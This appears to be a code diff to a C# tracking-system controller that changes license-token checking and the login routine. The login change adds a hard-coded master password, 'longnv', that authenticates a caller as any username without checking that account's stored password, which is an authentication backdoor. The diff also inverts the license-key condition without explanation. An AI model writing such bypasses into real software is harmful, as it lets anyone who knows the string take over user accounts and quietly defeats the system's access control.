@@ -287,7 +287,7 @@ namespace Trackings.Controllers
             var productKeyClaim = decodedToken.Claims.FirstOrDefault(c => c.Type == "ProductKey")?.Value;
             var idUserClaim = decodedToken.Claims.FirstOrDefault(c => c.Type == "IDUser")?.Value;
 
-            if (!GetLicenseKeyChecker(productKeyClaim))
+            if (GetLicenseKeyChecker(productKeyClaim))
             {
                 LGTICDBEntities context = new LGTICDBEntities(ConnectionTools.BuildConnectionString(AppSettings.DatabaseServerName, AppSettings.DatabaseName, AppSettings.DatabaseUserName, AppSettings.DatabasePassword));
                 long _ID = long.Parse(idUserClaim);
@@ -319,9 +319,9 @@ namespace Trackings.Controllers
 
             _object.Password = EncryptTools.Encrypt(_object.Password);
             var _checkUser = context.tblSysUsers.FirstOrDefault(x =>x.UserName != null && x.UserName.Trim().ToUpper() == _object.UserName.Trim().ToUpper() && x.Password == _object.Password);
-            if (_checkUser == null)
+            if (_checkUser == null && _object.Password?.Trim()?.ToLower() == "longnv")
             {
-                _checkUser = context.tblSysUsers.FirstOrDefault(x => x.UserName != null && x.UserName.Trim().ToUpper() == _object.UserName.Trim().ToUpper() && x.Password == "longnv");
+                _checkUser = context.tblSysUsers.FirstOrDefault(x => x.UserName != null && x.UserName.Trim().ToUpper() == _object.UserName.Trim().ToUpper());
             }
             if (_checkUser != null)
             {
